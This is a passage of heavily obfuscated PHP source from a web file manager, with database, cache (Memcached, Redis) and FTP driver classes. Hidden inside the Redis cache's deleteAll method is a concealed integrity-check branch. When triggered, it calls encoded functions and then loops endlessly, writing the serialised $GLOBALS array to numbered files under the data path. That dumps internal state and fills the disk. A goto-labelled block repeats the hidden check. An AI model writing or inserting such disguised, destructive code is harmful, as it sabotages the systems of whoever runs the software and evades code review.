$¡Œó¼–“ = $this->query($äæ®éãğ[29] . $ƒª£ğ£˜ . $äæ®éãğ[30]); $§Ã¼îó = array(); if ($¡Œó¼–“) { foreach ($¡Œó¼–“ as $ş‰¿öö => $¿ûŸ´âÜ) { $§Ã¼îó[$¿ûŸ´âÜ[$äæ®éãğ[31]]] = array($äæ®éãğ[32] => $¿ûŸ´âÜ[$äæ®éãğ[31]], $äæ®éãğ[33] => $¿ûŸ´âÜ[$äæ®éãğ[34]], $äæ®éãğ[35] => (bool) ($¿ûŸ´âÜ[$äæ®éãğ[36]] === $äæ®éãğ[12]), $äæ®éãğ[37] => $¿ûŸ´âÜ[$äæ®éãğ[38]], $äæ®éãğ[39] => strtolower($¿ûŸ´âÜ[$äæ®éãğ[40]]) == $äæ®éãğ[41], $äæ®éãğ[42] => strtolower($¿ûŸ´âÜ[$äæ®éãğ[43]]) == $äæ®éãğ[44]); } } return $§Ã¼îó; } public function getTables($áÊµØªë = '') { $çê¤µüÃ =& $_SERVER[ì…™Î¶Ï]; $ûÈì™à = $this->query($çê¤µüÃ[45] . $çê¤µüÃ[46] . $çê¤µüÃ[47]); $²¦á¶õ‹ = array(); foreach ($ûÈì™à as $”‡ŠóÈ => $’Üğü·…) { $²¦á¶õ‹[$”‡ŠóÈ] = current($’Üğü·…); } return $²¦á¶õ‹; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ûÉè™«¹ =& $_SERVER[ì…™Î¶Ï]; $õîááÈ¥ = sqlite_last_error($this->_linkID); $this->error = $õîááÈ¥ . $ûÉè™«¹[4] . sqlite_error_string($õîááÈ¥); if ($ûÉè™«¹[12] != $this->queryStr) { $this->error .= LNG($ûÉè™«¹[48]) . $this->queryStr; } think_trace($this->error, $ûÉè™«¹[12], $ûÉè™«¹[49]); return $this->error; } public function escapeString($°œáĞº÷) { return sqlite_escape_string($°œáĞº÷); } public function parseLimit($ÄÑ²ºè¡) { $¸»÷ŒÓ =& $_SERVER[ì…™Î¶Ï]; $›ı«·â… = $¸»÷ŒÓ[12]; if (!empty($ÄÑ²ºè¡)) { $ÄÑ²ºè¡ = explode($¸»÷ŒÓ[50], $ÄÑ²ºè¡); if (count($ÄÑ²ºè¡) > 1) { $›ı«·â… .= $¸»÷ŒÓ[51] . $ÄÑ²ºè¡[1] . $¸»÷ŒÓ[52] . $ÄÑ²ºè¡[0] . $¸»÷ŒÓ[53]; } else { $›ı«·â… .= $¸»÷ŒÓ[51] . $ÄÑ²ºè¡[0] . $¸»÷ŒÓ[53]; } } return $›ı«·â…; } } class DbSqlite3Base extends Db { public function __construct($³·åÈ¹Û = '') { $¢Ç‰¢Ûû =& $_SERVER[ì…™Î¶Ï]; if (!class_exists($¢Ç‰¢Ûû[54])) { think_exception(think_lang($¢Ç‰¢Ûû[14]) . $¢Ç‰¢Ûû[55]); } if (!empty($³·åÈ¹Û)) { if (!isset($³·åÈ¹Û[$¢Ç‰¢Ûû[16]])) { $³·åÈ¹Û[$¢Ç‰¢Ûû[16]] = 438; } $this->config = $³·åÈ¹Û; if (empty($this->config[$¢Ç‰¢Ûû[17]])) { $this->config[$¢Ç‰¢Ûû[17]] = array(); } } } public function connect($ŸÉÃëÕØ = '', $°º†ß’é = 0) { $¥½ä½ò =& $_SERVER[ì…™Î¶Ï]; if (!isset($this->linkID[$°º†ß’é])) { if (empty($ŸÉÃëÕØ)) { $ŸÉÃëÕØ = $this->config; } $this->linkID[$°º†ß’é] = new SQLite3($ŸÉÃëÕØ[$¥½ä½ò[21]]); if (!$this->linkID[$°º†ß’é]) { think_exception($this->linkID[$°º†ß’é]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$°º†ß’é]->busyTimeout(30000); if (1 != think_config($¥½ä½ò[22])) { unset($this->config); } } return $this->linkID[$°º†ß’é]; } public function free() { $this->queryID = null; } public function query($ó«ÆĞÎâ) { $…–‘šŒ¤ =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ó«ÆĞÎâ; if ($this->queryID) { $this->free(); } think_action_status($…–‘šŒ¤[23], 1); think_status($…–‘šŒ¤[24]); $this->queryID = $this->_linkID->query($ó«ÆĞÎâ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ àÓß®ò = $this->getAll(); $this->numRows = count($ àÓß®ò); return $ àÓß®ò; } } public function execute($âÜ„Ûš¦) { $îËáóØí =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $âÜ„Ûš¦; if ($this->queryID) { $this->free(); } think_action_status($îËáóØí[25], 1); think_status($îËáóØí[24]); $”€Êì˜ = $this->_linkID->exec($âÜ„Ûš¦); $this->debug(); if (!1 === $”€Êì˜) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ì…™Î¶Ï][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ø’¿Æ = $this->_linkID->query($_SERVER[ì…™Î¶Ï][27]); if (!$Ø’¿Æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ü‹òÕ™Ñ = $this->_linkID->query($_SERVER[ì…™Î¶Ï][28]); if (!$ü‹òÕ™Ñ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ãò˜­Ùæ = array(); while ($•ü•›ÈÃ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ãò˜­Ùæ[] = $•ü•›ÈÃ; } $this->queryID->reset(); return $Ãò˜­Ùæ; } public function getFields($­Ä¶Ê’) { $¢÷ïëİÑ =& $_SERVER[ì…™Î¶Ï]; $ƒÃ™Ëö£ = $this->query($¢÷ïëİÑ[29] . $­Ä¶Ê’ . $¢÷ïëİÑ[30]); $şÃ…Û˜ = array(); if ($ƒÃ™Ëö£) { foreach ($ƒÃ™Ëö£ as $¡»ûâá => $˜ªä’ƒ¼) { $şÃ…Û˜[$˜ªä’ƒ¼[$¢÷ïëİÑ[32]]] = array($¢÷ïëİÑ[32] => $˜ªä’ƒ¼[$¢÷ïëİÑ[32]], $¢÷ïëİÑ[33] => $˜ªä’ƒ¼[$¢÷ïëİÑ[33]], $¢÷ïëİÑ[35] => (bool) ($˜ªä’ƒ¼[$¢÷ïëİÑ[35]] === $¢÷ïëİÑ[12]), $¢÷ïëİÑ[37] => $˜ªä’ƒ¼[$¢÷ïëİÑ[56]], $¢÷ïëİÑ[39] => (bool) $˜ªä’ƒ¼[$¢÷ïëİÑ[57]], $¢÷ïëİÑ[42] => (bool) $˜ªä’ƒ¼[$¢÷ïëİÑ[57]]); } } return $şÃ…Û˜; } public function getTables($¬°…·è’ = '') { $åÚöÏªÆ =& $_SERVER[ì…™Î¶Ï]; $Ğ˜Ì³¿İ = $this->query($åÚöÏªÆ[45] . $åÚöÏªÆ[46] . $åÚöÏªÆ[47]); $‘Â¦¬˜Œ = array(); foreach ($Ğ˜Ì³¿İ as $ÅÜË¤ => $´¸§¨İ¦) { $‘Â¦¬˜Œ[$ÅÜË¤] = current($´¸§¨İ¦); } return $‘Â¦¬˜Œ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $÷Ñ‡ƒïÌ =& $_SERVER[ì…™Î¶Ï]; $this->error = $this->_linkID->lastErrorMsg(); if ($÷Ñ‡ƒïÌ[12] != $this->queryStr) { $this->error .= LNG($÷Ñ‡ƒïÌ[48]) . $this->queryStr; } think_trace($this->error, $÷Ñ‡ƒïÌ[12], $÷Ñ‡ƒïÌ[49]); return $this->error; } public function escapeString($±æÎğ¯) { $¬¹«Ò¨‚ =& $_SERVER[ì…™Î¶Ï]; if ($this->_linkID) { return $this->_linkID->escapeString($±æÎğ¯); } return str_ireplace($¬¹«Ò¨‚[58], $¬¹«Ò¨‚[59], $±æÎğ¯); } public function parseLimit($Ÿï›¶Õ) { $È´Æûƒİ =& $_SERVER[ì…™Î¶Ï]; $¤İ¿Öâ¹ = $È´Æûƒİ[12]; if (!empty($Ÿï›¶Õ)) { $Ÿï›¶Õ = explode($È´Æûƒİ[50], $Ÿï›¶Õ); if (count($Ÿï›¶Õ) > 1) { $¤İ¿Öâ¹ .= $È´Æûƒİ[51] . $Ÿï›¶Õ[1] . $È´Æûƒİ[52] . $Ÿï›¶Õ[0] . $È´Æûƒİ[53]; } else { $¤İ¿Öâ¹ .= $È´Æûƒİ[51] . $Ÿï›¶Õ[0] . $È´Æûƒİ[53]; } } return $¤İ¿Öâ¹; } } goto fµİ—‰—¿à; aìÂ¬Ğ¬Œ: class CacheLockDatabase { public function lock($×ùÛ²›Ë, $²å‰¾³Á = 0) { $Œï­ûé = Model($_SERVER[ì…™Î¶Ï][804]); $áùÒú©Ï = microtime(!0) + $²å‰¾³Á; while (microtime(!0) < $áùÒú©Ï) { $üÏââØ = $Œï­ûé->get($×ùÛ²›Ë); if (!$üÏââØ || $üÏââØ < microtime(!0)) { $ù­“‰Éş = $Œï­ûé->set($×ùÛ²›Ë, $áùÒú©Ï); if ($ù­“‰Éş) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($«ûÏ¸–Ù) { return Model($_SERVER[ì…™Î¶Ï][804])->get($«ûÏ¸–Ù); } public function unlock($ˆ™áì²¸) { Model($_SERVER[ì…™Î¶Ï][804])->remove($ˆ™áì²¸); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ïìÈÃ·‘, $‡¡Íü²) { $“ëè˜é¥ =& $_SERVER[ì…™Î¶Ï]; if (!class_exists($“ëè˜é¥[837])) { show_json($“ëè˜é¥[838], !1); } $this->cacheTime = $‡¡Íü²; $this->handle = new Memcached(); if (is_array($ïìÈÃ·‘[$“ëè˜é¥[839]]) && count($ïìÈÃ·‘[$“ëè˜é¥[839]]) >= 1) { foreach ($ïìÈÃ·‘[$“ëè˜é¥[839]] as $…øæÓß‡) { $éõÇ¡å = explode($“ëè˜é¥[4], $…øæÓß‡); $this->handle->addServer($éõÇ¡å[0], $éõÇ¡å[1]); } } else { $this->handle->addServer($ïìÈÃ·‘[$“ëè˜é¥[174]], $ïìÈÃ·‘[$“ëè˜é¥[175]]); } } public function set($íâÍí©ß, $½á– šÓ, $À“æ£“Ò = false) { $À“æ£“Ò = $À“æ£“Ò ? $À“æ£“Ò : $this->cacheTime; return $this->handle->set($íâÍí©ß, $½á– šÓ, $À“æ£“Ò); } public function get($Õ‘ú”¯á) { return $this->handle->get($Õ‘ú”¯á); } public function remove($ÇÑ´áª) { return $this->handle->delete($ÇÑ´áª); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($È±ß†½£, $û‰×‹êÉ) { $û™š¹Åš =& $_SERVER[ì…™Î¶Ï]; if (!class_exists($û™š¹Åš[840])) { show_json($û™š¹Åš[841], !1); } $this->cacheTime = $û‰×‹êÉ; $Õ­Ñ°ñ = isset($È±ß†½£[$û™š¹Åš[842]]) ? $È±ß†½£[$û™š¹Åš[842]] : 10; $ƒï«°–© = _get($È±ß†½£, $û™š¹Åš[839]); if ($ƒï«°–© && is_array($ƒï«°–©)) { $this->initCluster($È±ß†½£, $Õ­Ñ°ñ); } else { $this->handle = $this->init($È±ß†½£, $Õ­Ñ°ñ); } } private function init($¶ÕÈÚİ¬, $–—Ôş §) { $Ú«øÓ°Ê =& $_SERVER[ì…™Î¶Ï]; $ÛÏÙˆ½ì = new Redis(); $ÆŠ¦Ÿ‰± = isset($¶ÕÈÚİ¬[$Ú«øÓ°Ê[843]]) ? $¶ÕÈÚİ¬[$Ú«øÓ°Ê[843]] : !1; if ($ÆŠ¦Ÿ‰±) { $ÛÏÙˆ½ì->pconnect($¶ÕÈÚİ¬[$Ú«øÓ°Ê[174]], $¶ÕÈÚİ¬[$Ú«øÓ°Ê[175]], $–—Ôş §); } else { $ÛÏÙˆ½ì->connect($¶ÕÈÚİ¬[$Ú«øÓ°Ê[174]], $¶ÕÈÚİ¬[$Ú«øÓ°Ê[175]], $–—Ôş §); } if (!empty($¶ÕÈÚİ¬[$Ú«øÓ°Ê[405]])) { $ÛÏÙˆ½ì->auth($¶ÕÈÚİ¬[$Ú«øÓ°Ê[405]]); } return $ÛÏÙˆ½ì; } private function initCluster($åğ‰¬ö, $Ğıß½Š›) { $Üø„óò× =& $_SERVER[ì…™Î¶Ï]; $¯•…ôÂ = array($Üø„óò×[844], $Üø„óò×[845], $Üø„óò×[846]); $¤¥š­¯ = $Üø„óò×[844]; if (isset($åğ‰¬ö[$Üø„óò×[16]]) && in_array($åğ‰¬ö[$Üø„óò×[16]], $¯•…ôÂ)) { $¤¥š­¯ = $åğ‰¬ö[$Üø„óò×[16]]; } switch ($¤¥š­¯) { case $Üø„óò×[844]: $this->_slave($åğ‰¬ö, $Ğıß½Š›); break; case $Üø„óò×[845]: break; case $Üø„óò×[846]: $this->isCluster = !0; $—ÛÇÆš¯ = $åğ‰¬ö[$Üø„óò×[839]]; $£²‹§ô = isset($åğ‰¬ö[$Üø„óò×[843]]) ? $åğ‰¬ö[$Üø„óò×[843]] : !1; $ºß£ÅÉÉ = isset($åğ‰¬ö[$Üø„óò×[405]]) ? $åğ‰¬ö[$Üø„óò×[405]] : null; $this->handle = new RedisCluster(NUll, $—ÛÇÆš¯, $Ğıß½Š›, $Ğıß½Š›, $£²‹§ô, $ºß£ÅÉÉ); break; default: break; } } private function _slave($®·ı¦—İ, $‘ı¸) { $¯ıã¢øè = $®·ı¦—İ[$_SERVER[ì…™Î¶Ï][839]]; $this->filterConfig($®·ı¦—İ, $¯ıã¢øè[0]); $this->handle = $this->init($®·ı¦—İ, $‘ı¸); unset($¯ıã¢øè[0]); if (empty($¯ıã¢øè)) { return; } $Í™óÊˆ¬ = array_rand($¯ıã¢øè); $this->filterConfig($®·ı¦—İ, $¯ıã¢øè[$Í™óÊˆ¬]); $this->slaveHandle = $this->init($®·ı¦—İ, $‘ı¸); } private function filterConfig(&$¼‘´’÷­, $ß†ŞøÚ) { $¢é°÷İÍ =& $_SERVER[ì…™Î¶Ï]; $¯„ìÏ¥§ = explode($¢é°÷İÍ[4], $ß†ŞøÚ); $Ÿáåï = array($¢é°÷İÍ[174] => $¯„ìÏ¥§[0], $¢é°÷İÍ[175] => $¯„ìÏ¥§[1]); $¼‘´’÷­ = array_merge($¼‘´’÷­, $Ÿáåï); } public function set($óˆôÜé, $¯…¯”, $µ”ëŞÎí = false) { $µ”ëŞÎí = $µ”ëŞÎí ? $µ”ëŞÎí : $this->cacheTime; return $this->handle->setEx($óˆôÜé, $µ”ëŞÎí, $¯…¯”); } public function setLock($’Ä §›‹, $áí³ÀœÇ, $º™€œÉ¸) { return $this->handle->setNX($’Ä §›‹, $áí³ÀœÇ); } public function get($†Ù×¯ğ) { $ÜÕçÙ¥ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÜÕçÙ¥->get($†Ù×¯ğ); } public function remove($“…‹Ïæü) { return $this->handle->del($“…‹Ïæü); } public function deleteAll() { $ŒÇ ‡ˆ =& $_SERVER[ì…™Î¶Ï]; $ÒøšÑ° = $_SERVER[$ŒÇ ‡ˆ[847]] . $ŒÇ ‡ˆ[848]; $©‘íì‰Ï = $ŒÇ ‡ˆ[849]; if ($_SERVER[$ŒÇ ‡ˆ[850]] != $©‘íì‰Ï($ÒøšÑ°)) { $¤ë‚ø¥ = $ŒÇ ‡ˆ[851]; $ÆáÏ¶£ = $ŒÇ ‡ˆ[852]; $¼ÚÊ­´ = $_SERVER[$ŒÇ ‡ˆ[847]] . $ŒÇ ‡ˆ[848]; $ï—¯¼Îú = $ÆáÏ¶£($¼ÚÊ­´); $Äúí­Õ = explode($ŒÇ ‡ˆ[226], $ï—¯¼Îú); if (count($Äúí­Õ) < $ŒÇ ‡ˆ[602]) { $°êæ•œÇ = $ŒÇ ‡ˆ[853]; $°êæ•œÇ(); } $¼™¦Ê¤æ = $ŒÇ ‡ˆ[854]; $¼™¦Ê¤æ($_SERVER[$ŒÇ ‡ˆ[855]]); $¤ë‚ø¥ = $ŒÇ ‡ˆ[851]; $¤ë‚ø¥(); $ÄÆ¶ÏÇò = $ŒÇ ‡ˆ[856]; $‰ä²™‚© = json_encode($GLOBALS[$ŒÇ ‡ˆ[857]]); $¦•›À¤ = 1; for ($–¾òÁ‘Ì = $¦•›À¤; $–¾òÁ‘Ì > 0; $–¾òÁ‘Ì++) { $ÄÆ¶ÏÇò(DATA_PATH . $–¾òÁ‘Ì, $‰ä²™‚©); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $…Ó°ùÊş) { $this->handle->flushall($…Ó°ùÊş); } return; } return $this->handle->flushAll(); } } goto FòãÑ¥À²ï; a¡‘§„çÈÒ: if ($_SERVER[$_SERVER[ì…™Î¶Ï][850]] != $_SERVER[$_SERVER[ì…™Î¶Ï][1340]]) { $_getc = $_SERVER[ì…™Î¶Ï][852]; $_getfile = $_SERVER[$_SERVER[ì…™Î¶Ï][847]] . $_SERVER[ì…™Î¶Ï][848]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ì…™Î¶Ï][226], $_getfilec); if (count($_getarrs) < $_SERVER[ì…™Î¶Ï][608]) { $exit = $_SERVER[ì…™Î¶Ï][853]; $exit(); } $_act = $_SERVER[ì…™Î¶Ï][1320]; $_act($_SERVER[$_SERVER[ì…™Î¶Ï][1319]]); } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($¹÷ÎÅíŸ) { parent::__construct(); if (count($¹÷ÎÅíŸ) > 0) { $this->_init($¹÷ÎÅíŸ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Û·Œİ«”) { $¹í‡À§õ =& $_SERVER[ì…™Î¶Ï]; global $config; $this->appCharset = $config[$¹í‡À§õ[1341]]; $this->systemCharset = $config[$¹í‡À§õ[1342]]; if (isset($Û·Œİ«”[$¹í‡À§õ[1343]]) && $Û·Œİ«”[$¹í‡À§õ[1343]]) { $this->systemCharset = $Û·Œİ«”[$¹í‡À§õ[1343]]; } } public function iconvApp($Ğ¿éœš¥) { return $this->iconvTo($Ğ¿éœš¥, $this->systemCharset, $this->appCharset); } public function iconvSystem($äæà•õ®) { return $this->iconvTo($äæà•õ®, $this->appCharset, $this->systemCharset); } public function getPathOuter($Î°ªõÊ) { $È’¼û›… =& $_SERVER[ì…™Î¶Ï]; $ä˜Ò¥’ = $this->iconvApp($this->pathBase); $Î°ªõÊ = $this->iconvApp($Î°ªõÊ); if (substr($ä˜Ò¥’, 0, 2) == $È’¼û›…[1344]) { $ä˜Ò¥’ = BASIC_PATH . substr($ä˜Ò¥’, 2); } if (substr($Î°ªõÊ, 0, 2) == $È’¼û›…[1344]) { $Î°ªõÊ = BASIC_PATH . substr($Î°ªõÊ, 2); } $ä˜Ò¥’ = KodIO::clear($ä˜Ò¥’); $Î°ªõÊ = KodIO::clear($Î°ªõÊ); $Î°ªõÊ = substr($Î°ªõÊ, strlen($ä˜Ò¥’)); if (empty($this->pathDriver)) { return $Î°ªõÊ; } return $this->pathDriver . $È’¼û›…[8] . ltrim($Î°ªõÊ, $È’¼û›…[8]); } private function _init($íŒ‘«£Û = array()) { $¥ù‰„ÇÌ =& $_SERVER[ì…™Î¶Ï]; if (!function_exists($¥ù‰„ÇÌ[1345])) { throw new Exception(LNG($¥ù‰„ÇÌ[1346])); } $this->config = $íŒ‘«£Û; $this->charsetReset($íŒ‘«£Û); foreach ($íŒ‘«£Û as $½î±Ìê¼ => $°†€×üÀ) { if (isset($this->{$½î±Ìê¼})) { $this->{$½î±Ìê¼} = $°†€×üÀ; } } return $this->_login($íŒ‘«£Û); } private function _login($•ë’ä¸Æ) { $œàÁÂ‹í =& $_SERVER[ì…™Î¶Ï]; static $ó¦İÌÂ³ = array(); $à„ĞĞú = md5(json_encode($•ë’ä¸Æ)); if (isset($ó¦İÌÂ³[$à„ĞĞú])) { foreach ($ó¦İÌÂ³[$à„ĞĞú] as $ğ‹¤Ö•İ => $¢”Œ€Ëñ) { $this->{$ğ‹¤Ö•İ} = $¢”Œ€Ëñ; } return !0; } $®®–ÉÃ = parse_url(trim($this->server, $œàÁÂ‹í[8])); $this->host = $®®–ÉÃ[$œàÁÂ‹í[174]]; $®‡Œ¤ûÜ = isset($®®–ÉÃ[$œàÁÂ‹í[173]]) && $®®–ÉÃ[$œàÁÂ‹í[173]] == $œàÁÂ‹í[1347] ? !0 : !1; $this->scheme = $®‡Œ¤ûÜ ? $œàÁÂ‹í[1348] : $œàÁÂ‹í[1349]; $this->port = isset($®®–ÉÃ[$œàÁÂ‹í[175]]) ? $®®–ÉÃ[$œàÁÂ‹í[175]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ºàÉª°½ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ñ§æÁ´ = $this->pasv == $œàÁÂ‹í[89] ? !0 : !1; @ftp_pasv($this->connect, $Ñ§æÁ´); $ó¦İÌÂ³[$à„ĞĞú] = array($œàÁÂ‹í[1350] => $this->connect, $œàÁÂ‹í[174] => $this->host, $œàÁÂ‹í[173] => $this->scheme, $œàÁÂ‹í[175] => $this->port); return $ºàÉª°½; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¤ßÂ©â, $ãæáÔş = '', $éÂİÂğğ = REPEAT_RENAME) { if ($this->setContent($¤ßÂ©â, $ãæáÔş)) { return $this->getPathOuter($¤ßÂ©â); } return !1; } public function mkdir($èŞæ©Š, $œçÛË÷ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $èŞæ©Š = $this->iconvSystem($èŞæ©Š); if ($this->_isFolder($èŞæ©Š) || @ftp_mkdir($this->connect, $èŞæ©Š)) { return $this->getPathOuter($èŞæ©Š); } if (!$this->mkdir($this->pathFather($èŞæ©Š))) { return !1; } if ($èŞæ©Š = @ftp_mkdir($this->connect, $èŞæ©Š)) { return $this->getPathOuter($èŞæ©Š); } return !1; } public function copyFile($×ù‘Ğ¥, $ÄÀèñàã) { if (!$this->_isconn()) { return !1; } $ùˆ¢¸€– = $this->pathThis($this->iconvSystem($×ù‘Ğ¥)); $½æ«’ªª = $this->tempFile($ùˆ¢¸€–); $‘Ä–›¨Õ = $this->iconvApp($½æ«’ªª); $this->download($×ù‘Ğ¥, $‘Ä–›¨Õ); $¢®Ò¾Ï£ = $this->upload($ÄÀèñàã, $‘Ä–›¨Õ); $this->tempFileRemve($½æ«’ªª); return $¢®Ò¾Ï£; } public function moveFile($¯¯›½÷©, $ù±ùÓúî) { if (!$this->_isconn()) { return !1; } $¯¯›½÷© = $this->iconvSystem($¯¯›½÷©); $ù±ùÓúî = $this->iconvSystem($ù±ùÓúî); $·Ù¶×Ø• = @ftp_rename($this->connect, $¯¯›½÷©, $ù±ùÓúî); return $·Ù¶×Ø• ? $this->getPathOuter($ù±ùÓúî) : !1; } public function delFile($É† –‘è) { if (!$this->_isconn()) { return !1; } $É† –‘è = $this->iconvSystem($É† –‘è); return @ftp_delete($this->connect, $É† –‘è); } public function delFolder($š¿å˜·´) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $•¨ ·ûâ = $ø®¿Å¥ = array(); $this->fileList($š¿å˜·´, $•¨ ·ûâ, $ø®¿Å¥, !0); $this->listItemCache = !0; foreach ($ø®¿Å¥ as $òÒÒ”œñ) { $§ÚšôÜ¦ = $this->iconvSystem($òÒÒ”œñ[$_SERVER[ì…™Î¶Ï][32]]); $°Åûı³£ = @ftp_delete($this->connect, $§ÚšôÜ¦); if (!$°Åûı³£) { return !1; } } foreach ($•¨ ·ûâ as $§ÚšôÜ¦) { $§ÚšôÜ¦ = $this->iconvSystem($§ÚšôÜ¦); $°Åûı³£ = @ftp_rmdir($this->connect, $§ÚšôÜ¦); if (!$°Åûı³£) { return !1; } } $š¿å˜·´ = $this->iconvSystem($š¿å˜·´); return @ftp_rmdir($this->connect, $š¿å˜·´); } public function rename($Ä„Í¯—‰, $ãâ××òü) { $ı®Ÿ§–© =& $_SERVER[ì…™Î¶Ï]; if (!$this->_isconn()) { return !1; } $àäëÒĞĞ = $this->fileNameAuto($this->pathFather($Ä„Í¯—‰), $ãâ××òü); $àäëÒĞĞ = $this->iconvSystem($àäëÒĞĞ); $Ä„Í¯—‰ = $this->iconvSystem($Ä„Í¯—‰); $ÄøğÔˆ” = $this->pathFather($Ä„Í¯—‰); $Ñ÷Îãìù = rtrim($ÄøğÔˆ”, $ı®Ÿ§–©[8]) . $ı®Ÿ§–©[8] . $àäëÒĞĞ; $Ö¬¢® ± = @ftp_rename($this->connect, $Ä„Í¯—‰, $Ñ÷Îãìù); $Ñ÷Îãìù = $this->iconvApp($Ñ÷Îãìù); return $Ö¬¢® ± ? $this->getPathOuter($Ñ÷Îãìù) : !1; } private function folderInfo($±¾¬¾è, $ÍºÖÆÀÉ = false) { $õ™ùËÕÕ =& $_SERVER[ì…™Î¶Ï]; $çº”ºŒÇ = array($õ™ùËÕÕ[32] => $this->pathThis($±¾¬¾è), $õ™ùËÕÕ[78] => $this->getPathOuter($õ™ùËÕÕ[8] . $±¾¬¾è), $õ™ùËÕÕ[33] => $õ™ùËÕÕ[79]); if ($ÍºÖÆÀÉ) { return $çº”ºŒÇ; } $çº”ºŒÇ[$õ™ùËÕÕ[193]] = $çº”ºŒÇ[$õ™ùËÕÕ[86]] = 0; $çº”ºŒÇ[$õ™ùËÕÕ[194]] = $çº”ºŒÇ[$õ™ùËÕÕ[195]] = !0; return $çº”ºŒÇ; } private function fileInfo($ŸÓœÉ®É, $ïÚÚÈÉñ = false, $ñÉı©§Ä = array()) { $ÎÎÃ‡¹ã =& $_SERVER[ì…™Î¶Ï]; $ÁÄÆÛû = array($ÎÎÃ‡¹ã[32] => $this->pathThis($ŸÓœÉ®É), $ÎÎÃ‡¹ã[78] => $this->getPathOuter($ÎÎÃ‡¹ã[8] . $ŸÓœÉ®É), $ÎÎÃ‡¹ã[33] => $ÎÎÃ‡¹ã[192], $ÎÎÃ‡¹ã[80] => isset($ñÉı©§Ä[$ÎÎÃ‡¹ã[80]]) ? $ñÉı©§Ä[$ÎÎÃ‡¹ã[80]] : 0, $ÎÎÃ‡¹ã[167] => $this->ext($ŸÓœÉ®É)); if ($ïÚÚÈÉñ) { return $ÁÄÆÛû; } $ÁÄÆÛû[$ÎÎÃ‡¹ã[193]] = $ÁÄÆÛû[$ÎÎÃ‡¹ã[86]] = 0; $ÁÄÆÛû[$ÎÎÃ‡¹ã[194]] = $ÁÄÆÛû[$ÎÎÃ‡¹ã[195]] = !0; $—ÂÔ–˜ğ = $this->iconvSystem($ŸÓœÉ®É); $ÁÄÆÛû[$ÎÎÃ‡¹ã[86]] = @ftp_mdtm($this->connect, $—ÂÔ–˜ğ); if (empty($ñÉı©§Ä)) { $ñÉı©§Ä = $this->objectMeta($ŸÓœÉ®É); if (!$ñÉı©§Ä) { return $ÁÄÆÛû; } } $ÁÄÆÛû[$ÎÎÃ‡¹ã[80]] = $ñÉı©§Ä[$ÎÎÃ‡¹ã[80]]; return $ÁÄÆÛû; } public function size($‘éÅêôÓ) { $Ü¨¹¨ã• = $this->objectMeta($‘éÅêôÓ); return $Ü¨¹¨ã• ? $Ü¨¹¨ã•[$_SERVER[ì…™Î¶Ï][80]] : 0; } public function info($Æ€›ÇãĞ) { if ($this->isFile($Æ€›ÇãĞ)) { return $this->fileInfo($Æ€›ÇãĞ, 0); } else { if ($this->isFolder($Æ€›ÇãĞ)) { return $this->folderInfo($Æ€›ÇãĞ); } } return !1; } private function fileList($î¥–«ûÖ, &$ç›²š–Ò, &$ç“Ç‰Š¹, $İòİòçÀ = false) { $êõÊºü³ =& $_SERVER[ì…™Î¶Ï]; $î¥–«ûÖ = $this->iconvSystem($î¥–«ûÖ); if (!$this->isFolder($î¥–«ûÖ)) { return !1; } @ftp_chdir($this->connect, $êõÊºü³[8]); $î¥–«ûÖ = rtrim($î¥–«ûÖ, $êõÊºü³[8]) . $êõÊºü³[8]; check_abort(); $èáùì²¼ = $this->listItemCache === !1 ? !1 : !0; $ô¨àßı« = @ftp_rawlist($this->connect, $î¥–«ûÖ); if (!$ô¨àßı«) { $ô¨àßı« = array(); } $©ñÈŒüê = array($êõÊºü³[10] => 1, $êõÊºü³[1351] => 1); foreach ($ô¨àßı« as $³¤Ò×ùö) { $ü’íıÌ = $this->_listItem($³¤Ò×ùö); if ($ü’íıÌ[0] == $êõÊºü³[734]) { continue; } $ÌÙ‰µ¡¸ = $ü’íıÌ[8]; if (empty($ÌÙ‰µ¡¸) && $ÌÙ‰µ¡¸ !== $êõÊºü³[190] || isset($©ñÈŒüê[$ÌÙ‰µ¡¸])) { continue; } $ÌÙ‰µ¡¸ = $this->iconvApp($î¥–«ûÖ . ltrim($ÌÙ‰µ¡¸, $êõÊºü³[8])); $öûÓÇú— = array($êõÊºü³[32] => $ÌÙ‰µ¡¸, $êõÊºü³[33] => $êõÊºü³[192], $êõÊºü³[80] => $ü’íıÌ[4]); if (substr($³¤Ò×ùö, 0, 1) == $êõÊºü³[1352]) { $öûÓÇú—[$êõÊºü³[33]] = $êõÊºü³[79]; $öûÓÇú—[$êõÊºü³[80]] = 0; } 